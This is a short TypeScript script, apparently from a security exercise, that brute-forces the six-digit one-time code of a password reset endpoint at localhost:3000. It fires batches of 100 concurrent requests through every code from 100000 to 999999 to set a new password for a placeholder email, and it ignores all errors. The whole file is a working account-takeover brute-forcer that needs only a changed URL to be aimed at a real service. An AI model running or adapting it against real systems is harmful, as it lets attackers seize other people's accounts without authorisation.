import axios from 'axios';

async function sendReq(otp: string) {

    let data = JSON.stringify({
        "email": "example@gmail.com",
        "otp": otp,
        "newPassword": "awdawd"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': 'Cookie_1=value'
        },
        data: data
    };

    try {
        await axios.request(config)
    } catch (error) {
       
    }

}

async function otpgenerator() {
    for (let i = 100000; i <= 999999; i+=100) {
        const p = [];
        console.log(i)
        for(let j=0;j<100;j++){
            p.push(sendReq((i+j).toString()))
        }
        await Promise.all(p)
    }
}
otpgenerator()
